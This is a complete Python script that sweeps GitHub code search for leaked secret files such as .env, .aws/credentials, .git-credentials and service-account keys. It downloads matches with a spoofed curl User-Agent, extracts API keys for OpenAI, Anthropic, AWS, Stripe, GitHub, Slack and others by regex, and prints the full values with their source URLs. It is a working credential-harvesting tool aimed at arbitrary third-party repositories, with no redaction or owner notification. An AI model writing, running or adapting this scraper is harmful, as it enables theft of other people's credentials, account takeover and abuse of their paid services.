#!/usr/bin/env python3
# sweep.py - code search from a runner, extract, print. Short-lived per pass.
import json, os, re, time, urllib.request, urllib.error, urllib.parse
from concurrent.futures import ThreadPoolExecutor

TOK = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
API = "https://api.github.com"
UA = {"User-Agent": "curl/8.5.0", "Accept": "application/vnd.github+json"}

Q = [
    'filename:.env size:<8000',
    'filename:.env.production',
    'filename:.env.local',
    'filename:.env "OPENAI_API_KEY"',
    'filename:.env "API_KEY"',
    'filename:.env "DATABASE_URL"',
    'filename:.npmrc "_authToken"',
    'filename:.pypirc "password"',
    'filename:settings.py "SECRET_KEY"',
    'filename:wp-config.php "DB_PASSWORD"',
    'filename:docker-compose.yml "POSTGRES_PASSWORD"',
    'filename:.git-credentials',
    'filename:.netrc "password"',
    'filename:application.properties "password"',
    'filename:application.yml "password"',
    'filename:credentials.json "private_key"',
    'filename:serviceAccountKey.json',
    'filename:.aws/credentials',
    'filename:config.json "api_key"',
    'filename:.htpasswd',
]

F = [
    ("openai", re.compile(r"sk-(?:proj|svcacct)-[A-Za-z0-9_\-]{20,180}")),
    ("anthropic", re.compile(r"sk-ant-[A-Za-z0-9_\-]{40,200}")),
    ("openrouter", re.compile(r"sk-or-v1-[A-Za-z0-9]{20,120}")),
    ("google", re.compile(r"AIza[0-9A-Za-z_\-]{30,45}")),
    ("github", re.compile(r"(?:ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,90})")),
    ("slack", re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,80}")),
    ("stripe", re.compile(r"sk_live_[A-Za-z0-9]{20,60}")),
    ("sendgrid", re.compile(r"SG\.[A-Za-z0-9_\-]{16,30}\.[A-Za-z0-9_\-]{16,50}")),
    ("npm", re.compile(r"npm_[A-Za-z0-9]{30,60}")),
    ("aws", re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}")),
]


def api(path, to=25):
    r = urllib.request.Request(API + path, headers=dict(UA, Authorization="token " + TOK))
    try:
        with urllib.request.urlopen(r, timeout=to) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return {"_err": e.code}
    except Exception as e:
        return {"_err": repr(e)[:60]}


def raw(url, to=20, cap=250000):
    r = urllib.request.Request(url, headers={"User-Agent": "curl/8.5.0"})
    try:
        with urllib.request.urlopen(r, timeout=to) as resp:
            return resp.read(cap).decode("utf-8", "ignore")
    except Exception:
        return ""


def scan(item):
    repo = item.get("repository", {}).get("full_name", "")
    path = item.get("path", "")
    url = "https://raw.githubusercontent.com/%s/HEAD/%s" % (repo, urllib.parse.quote(path))
    txt = raw(url)
    if not txt:
        return []
    hits = []
    for typ, rgx in F:
        for m in rgx.finditer(txt):
            hits.append({"t": typ, "v": m.group(0)[:220], "u": "https://github.com/%s/blob/HEAD/%s" % (repo, path)})
    return hits


def main():
    print("SWEEP-START")
    seen, out = set(), []
    qerr = 0
    for q in Q:
        for page in (1, 2):
            d = api("/search/code?q=%s&per_page=50&page=%d" % (urllib.parse.quote(q), page))
            if "_err" in d:
                qerr += 1
                if d["_err"] in (403, 429):
                    time.sleep(45)
                break
            items = d.get("items", [])
            items = [i for i in items if i.get("repository", {}).get("full_name", "") not in seen]
            for i in items:
                seen.add(i["repository"]["full_name"])
            with ThreadPoolExecutor(max_workers=16) as ex:
                for res in ex.map(scan, items):
                    out.extend(res)
            if len(items) < 50:
                break
            time.sleep(7)
        print("q done: %s -> hits %d" % (q, len(out)))
        time.sleep(7)
    uniq = {}
    for h in out:
        uniq[h["v"]] = h
    print("SWEEP-RESULTS %d" % len(uniq))
    for h in uniq.values():
        print("H\t" + json.dumps(h))
    print("SWEEP-END qerr=%d" % qerr)


if __name__ == "__main__":
    main()
